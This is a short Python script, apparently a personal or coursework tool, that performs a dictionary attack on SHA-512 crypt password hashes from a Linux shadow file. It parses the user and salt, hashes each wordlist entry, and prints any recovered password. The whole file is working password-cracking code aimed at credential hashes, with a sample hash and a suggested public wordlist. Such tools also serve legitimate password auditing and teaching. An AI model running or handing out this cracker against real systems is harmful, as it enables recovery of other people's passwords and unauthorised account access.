#!/usr/bin/env python3
# Script that performs a dictionary attack against known password hashes
# Needs a dictionary file, suggested to use https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials
# By Keegan 10/26

# imports
import os
from passlib.hash import sha512_crypt

# load dictionary function
def load_dictionary(file_name):
    # get current directory
    script_path = os.path.abspath(__file__)
    script_dir = os.path.dirname(script_path)
    # build file path
    file_path = os.path.join(script_dir, file_name)
    # open file for reading
    f = open(file_path, "r")
    # read contents
    contents = f.readlines()
    return contents

# create hash function
def create_hash(password, salt):
    hashed_pass = sha512_crypt.using(rounds=5000).hash(password, salt=salt)
    return hashed_pass

def split_shadow(shadowLine):
    # separate username from shadow line
    split_shadow_parts = shadowLine.split(":")
    # username
    shadow_user = split_shadow_parts[0]
    # hash, salt, password
    user_shadow_line = split_shadow_parts[1]
    # salt
    user_salt = user_shadow_line.split("$")[2]
    return (shadow_user, user_salt, user_shadow_line)


# get input from user
sample_hash = "test:$6$KCZ30T.pBobQcvvd$QYHrZIUZE4dwZKITwxfFPAz4DRTQ4erDPMjSDLM8Wx/55U8aeW05tHuHHkG8lFPRhY.XRUIiOHg3OFE1yDohk0"
shadow_line = input("Line from shadow file: ") or sample_hash

shadow_user, user_salt, user_shadow_line = split_shadow(shadow_line)

count = 0

password_found = False
# load dictionary
password_guesses = load_dictionary("top10000000.txt")
# for each line/guess
for password_guess in password_guesses:
    # hash guess
    hashed_guess = create_hash(password_guess.strip(), user_salt)
    # compare hash to guess
    if user_shadow_line == hashed_guess:
        # print guess
        print('\n',shadow_user, password_guess.strip())
        # quit
        password_found = True
        break
    count += 1
    print(f"Count: {count}", end='\r')
    
# print not found
if password_found == False:
    print("Password not found.")